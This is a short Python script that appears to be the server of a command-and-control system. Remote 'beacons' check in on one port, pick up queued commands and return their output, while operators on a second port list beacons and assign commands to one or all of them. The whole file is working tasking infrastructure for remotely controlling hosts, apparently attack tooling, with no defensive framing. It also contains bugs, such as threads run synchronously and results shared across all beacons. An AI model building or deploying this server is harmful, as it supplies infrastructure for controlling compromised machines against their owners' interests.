#!/usr/bin/env python3

from threading import Thread
import socket
import json
from datetime import datetime
import struct

# (command_id, command, beacon_id, socket)[]
commands = []
# Beacon[]
beacons = []
command_id = 0


def sendall(s, d):
    d = d.encode("utf-8")
    s.sendall(struct.pack("!i", len(d)))
    s.sendall(d)


def recv(s):
    d = s.recv(4)
    if len(d) != 4:
        return ""
    (l,) = struct.unpack("!i", d)
    return s.recv(l).decode()


class Beacon:
    name = ""
    # (id, done, results)[]
    command_results = []


def accept_beacon_connection(socket, addr):
    global commands
    global beacons
    global command_id

    print("Handling beacon")
    try:
        bid = recv(socket)

        beacon = next((beacon for beacon in beacons if beacon.name == bid), None)

        if beacon is None:
            beacon = Beacon()
            beacons.append(beacon)
            beacon.name = bid

        commands_to_send = [
            {"command_id": command_id, "command": command}
            for (command_id, command, beacon_id, socket) in commands
            if not any(
                (rcid == command_id for (rcid, _done, _res) in beacon.command_results)
            )
            and (beacon_id == bid or beacon_id is None or beacon_id == "*")
        ]
        cmds = json.dumps(commands_to_send)
        sendall(socket, cmds)

        if len(commands_to_send) == 0:
            socket.close()
            return

        res = recv(socket)
        res_json = json.loads(res)

        socket.close()

        for result in res_json:
            beacon.command_results.append(
                (result["command_id"], datetime.now(), result["stdout"])
            )

            try:
                sock = next(
                    (
                        socket
                        for (cid, _, bid, socket) in commands
                        if cid == result["command_id"]
                    ),
                    None,
                )
                if sock is not None:
                    sendall(
                        sock,
                        json.dumps(
                            {
                                "command_id": result["command_id"],
                                "result": result["stdout"],
                            }
                        ),
                    )
            except Exception as e:
                print("result exception:", e)

    except Exception as e:
        print("beacon exception:", e)
        socket.close()


def accept_client_connection(socket):
    global commands
    global command_id
    global beacons

    print("Handling client")
    while True:
        try:
            data = recv(socket)

            if not data:
                break

            if data == "beacons":
                data = "\n".join(b.name for b in beacons)
                sendall(socket, data)
            else:
                res = json.loads(data)
                commands.append((command_id, res["command"], res["beacon_id"], socket))
                sendall(socket, json.dumps({"command_id": command_id}))
                command_id += 1
        except Exception as e:
            print(e)


def beacon_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        server.bind(("0.0.0.0", 54248))
        server.listen()

        while True:
            conn, addr = server.accept()
            Thread(target=accept_beacon_connection, args=(conn, addr)).run()


def client_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        server.bind(("0.0.0.0", 54249))
        server.listen()

        while True:
            conn, addr = server.accept()
            Thread(target=accept_client_connection, args=(conn,)).run()


beacons_thread = Thread(target=beacon_server)
beacons_thread.start()

clients_thread = Thread(target=client_server)
clients_thread.start()

beacons_thread.join()
clients_thread.run()
